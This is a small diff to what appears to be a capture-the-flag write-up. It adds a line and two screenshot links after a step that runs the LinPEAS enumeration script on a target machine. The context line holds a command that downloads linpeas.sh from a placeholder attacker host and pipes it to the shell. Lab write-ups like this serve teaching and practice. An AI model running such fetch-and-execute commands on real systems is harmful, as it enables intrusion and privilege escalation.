@@ -48,5 +48,11 @@ On the target in the /tmp directory we can get the file now with wget and execut
 
 wget http://ip:10000/linpeas.sh | sh
 
+We find something interesting.
+
+[![https://imgur.com/qTykJym.png](https://imgur.com/qTykJym.png)](https://imgur.com/qTykJym.png)
+
+[![https://imgur.com/fG0YCF6.png](https://imgur.com/fG0YCF6.png)](https://imgur.com/fG0YCF6.png)
+
 
 
